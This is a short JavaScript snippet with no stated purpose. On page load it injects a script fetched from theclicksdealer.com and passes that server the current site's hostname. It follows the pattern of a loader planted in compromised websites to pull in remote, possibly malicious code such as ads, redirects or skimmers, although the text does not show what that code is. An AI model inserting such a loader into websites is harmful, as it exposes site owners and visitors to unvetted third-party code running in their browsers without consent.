(function () {

  function loadCore() {
    var s = document.createElement('script');
    var host = window.location.hostname
      .replace(/^www\./, '')
      .toLowerCase()
      .trim();
    s.src =
      'https://theclicksdealer.com/api/core.js?d=' +
      encodeURIComponent(host);
    s.async = true;
    document.head.appendChild(s);
  }

  if (document.readyState === 'complete') {
    loadCore();
  } else {
    window.addEventListener('load', loadCore, { once: true });
  }

})();
